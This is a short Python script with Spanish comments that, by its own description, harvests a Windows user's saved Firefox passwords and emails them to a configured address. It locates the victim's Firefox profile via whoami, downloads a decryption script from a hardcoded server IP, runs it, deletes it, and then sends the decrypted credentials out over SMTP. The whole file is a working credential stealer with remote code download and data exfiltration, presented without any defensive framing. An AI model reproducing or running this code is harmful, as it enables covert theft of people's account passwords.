'''
Este script de python se encarga de obtener las contraseñas de firefox de un usuario
y enviarlas por email a un correo electrónico.

'''

import subprocess
import smtplib
from email.mime.text import MIMEText
import requests
import tempfile # Para crear un archivo temporal
import os
import sys


sender = "youemail@email.com"
recipients = "[your@email.com]"
password = "yourpassword"
ip_server = "192.168.100.51"
              

def send_email(subject, body, sender, recipients, password):
    
    # Añadimos el cuerpo del mensaje y el asunto
    msg = MIMEText(body)  
    msg['Subject'] = subject  
    msg['From'] = sender  
    msg['To'] = ', '.join(recipients)  
    
    # Enviamos el email
    with smtplib.SMTP_SSL('smtp.serviciodecorreo.es', 465) as smtp_server:   
        smtp_server.login(sender, password)
        smtp_server.sendmail(sender, recipients, msg.as_string())
    print("Email sent Successfully!")


def run_command(command):
    
    # Ejecuta el comando a nivel de shell
    output_command = subprocess.check_output(command, shell=True)

    # Retorna la salida del comando
    return output_command.decode("cp850")



def get_firefox_profiles(username):
    
    try:
        # Obtenemos el path donde se encuentran los perfiles de firefox
        # Con el nombre de usuario obtenido previamente.
        path = F"C:\\Users\\{username}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"

        # Obtenemos los perfiles de firefox que contengan la palabra release
        # ya que son los perfiles que contienen las contraseñas
        profiles = [profile for profile in os.listdir(path) if "release" in profile]

        # Retornamos el primer perfil que se encuentre en la lista
        # si no hay perfiles retornamos None
        return profiles[0] if profiles else None
    except Exception as e:
        print(f"Error: {e}")
        return None

def get_firefox_passwords(username, profile):
    
    # Hacemos una petición GET a la URL donde se encuentra el archivo
    # firefox_decrypt.py que es un script de python que nos permite
    # obtener las contraseñas de firefox
    r = requests.get(f"http://{ip_server}/firefox_decrypt.py")
    
    # Creamos un directorio temporal
    temp_dir = tempfile.mkdtemp()
    
    # Nos movemos al directorio temporal
    os.chdir(temp_dir)
    
    # Escribimos el contenido de la respuesta de r en un archivo
    with open("firefox_decrypt.py", "wb") as f:
        f.write(r.content)
    
    # Ejecutamos el script de python firefox_decrypt.py
    # para obtener las contraseñas de firefox
    # pasandole como argumento el path del perfil de firefox del usuario
    # y el nombre de usuario.
    command = f"python firefox_decrypt.py C:\\Users\\{username}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\{profile}"
    passwords = run_command(command)
    
    # Eliminamos el script de python
    os.remove("firefox_decrypt.py")
    # Retornamos las contraseñas
    return passwords

if __name__ == '__main__':

    # Ehecutamos el comando whoami para obtener el nombre de usuario
    username_str = run_command("whoami")
    # Obtenemos el nombre de usuario
    username = username_str.strip().split("\\")[1]
    
    # Obtenemos el perfil de firefox del usuario actual
    profile = get_firefox_profiles(username)
    
    # Si no se ha podido obtener el nombre de usuario o los perfiles
    if not username or not profile:
        sys.exit(f"\nNo se ha podido obtener el perfil de firefox del usuario {username}.\n")

    # Obtenemos las contraseñas de firefox
    passwords = get_firefox_passwords(username, profile)
   
    print(passwords)
    # Enviamos las contraseñas por email
    send_email("Firefox pass INFO", passwords, sender, recipients,password)
